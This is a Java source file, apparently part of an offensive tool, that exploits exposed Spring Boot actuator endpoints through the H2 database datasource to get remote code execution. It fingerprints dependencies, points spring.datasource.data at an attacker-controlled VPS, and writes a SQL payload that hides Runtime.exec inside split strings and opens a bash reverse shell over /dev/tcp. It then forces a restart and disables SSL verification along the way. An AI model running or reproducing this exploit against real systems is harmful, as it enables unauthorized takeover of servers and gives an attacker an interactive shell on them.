package src.main.module;

import src.main.impl.ResultCallback;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class H2DataSourceRCE {
    private String address;
    public  String text;
    private String vpsIP;
    private String vpsPort;
    public String expData1 = "spring.datasource.data=http://%s/H2DbSourcePoc.sql";
    public String expData2 = "{\"name\":\"spring.datasource.data\",\"value\":\"http://%s/H2DbSourcePoc.sql\"}";
    private static String sqlexp = "CREATE ALIAS %s AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL %s('/bin/bash','-c','bash -i >& /dev/tcp/%s/8881 0>&1');";
    public String flag = "T";
    public static int count = 5;

    public H2DataSourceRCE(String address,String vpsIP,String vpsPort){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
    }
    public void Result1(ResultCallback callback){
        String api = "/env";
        String site = address + api;
        String restapi = "/restart";
        String restsite = address + restapi;
        String llib = "h2database";
        String llib1 = "spring-boot-starter-data-jpa";
        String data = String.format(expData1,vpsIP + ":" + vpsPort);
        disableSSLVerification();
        try {
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib) && response.toString().contains(llib1))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-boot-starter-data-jpa 依赖为：%s",matcher1.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type","application/json");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK){
                        try {
                            flag = "T" + new String(String.valueOf(count));
                            String exp = String.format(sqlexp, flag,flag, vpsIP);
                            FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/H2DbSourcePoc.sql");
                            Scanner sc = new Scanner(System.in);
                            writer.write(exp);
                            sc.close();
                            writer.close();
                            text = "H2DbSourcePoc.sql文件写入成功";
                            callback.onResult(text);
                            ++count;
                            URL obj2 = new URL(restsite);
                            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                            conn2.setRequestMethod("POST");
                            conn2.setRequestProperty("Content-Type", "application/json");
                            conn2.setDoOutput(true);
                            int responseCode2 = conn2.getResponseCode();
                            if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                text = "请求成功，请到反弹vps上查看";
                                callback.onResult(text);
                            } else {
                                text = "反弹失败，请查看vps状态或网络状态后重试";
                                callback.onResult(text);
                            }
                        }catch (IOException e){
                            text = "写入文件异常";
                            callback.onResult(text);
                            e.printStackTrace();
                        }
                    }else{
                        text = "发送restart失败，请重试";
                        callback.onResult(text);
                    }
                }
                else {
                    text = "未找到h2database 依赖和spring-boot-starter-data-jpa 依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败，请重试";
                callback.onResult(text);
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String restapi = "/actuator/restart";
        String restsite = address + restapi;
        String llib = "h2database";
        String llib1 = "spring-boot-starter-data-jpa";
        String data = String.format(expData2,vpsIP + ":" + vpsPort);
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib) && response.toString().contains(llib1))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-boot-starter-data-jpa 依赖为：%s",matcher1.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type","application/json");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK){
                        try {
                            flag = "T" + new String(String.valueOf(count));
                            String exp = String.format(sqlexp, flag, flag, vpsIP);
                            FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/H2DbSourcePoc.sql");
                            Scanner sc = new Scanner(System.in);
                            writer.write(exp);
                            sc.close();
                            writer.close();
                            text = "H2DbSourcePoc.sql文件写入成功";
                            callback.onResult(text);
                            ++count;
                            URL obj2 = new URL(restsite);
                            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                            conn2.setRequestMethod("POST");
                            conn2.setRequestProperty("Content-Type", "application/json");
                            conn2.setDoOutput(true);
                            int responseCode2 = conn2.getResponseCode();
                            if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                text = "请求成功，请到反弹vps上查看";
                                callback.onResult(text);
                            } else {
                                text = "反弹失败，请查看vps状态或网络状态后重试";
                                callback.onResult(text);
                            }
                        }catch (IOException e){
                        text = "写入文件异常";
                        callback.onResult(text);
                        e.printStackTrace();
                    }
                    }else{
                        text = "发送restart失败，请重试";
                        callback.onResult(text);
                    }
                }
                else {
                    text = "未找到h2database 依赖和spring-boot-starter-data-jpa 依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败，请重试";
                callback.onResult(text);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public Stream<String> Exp(ResultCallback callback){
        Stream.Builder<String> builder = Stream.builder();
        String api ="/actuator/env";
        String site = address + api;
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                // 存在路径是springboot2，否则是springboot1
                text = "当前版本为springboot2";
                callback.onResult("当前版本为springboot2");
                Result2(callback);
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult("当前版本为springboot1");
                Result1(callback);
            }else{
                callback.onResult("未识别springboot版本");
            }
        }catch (IOException e){
            e.printStackTrace();
        }
        return builder.build();
    }
}
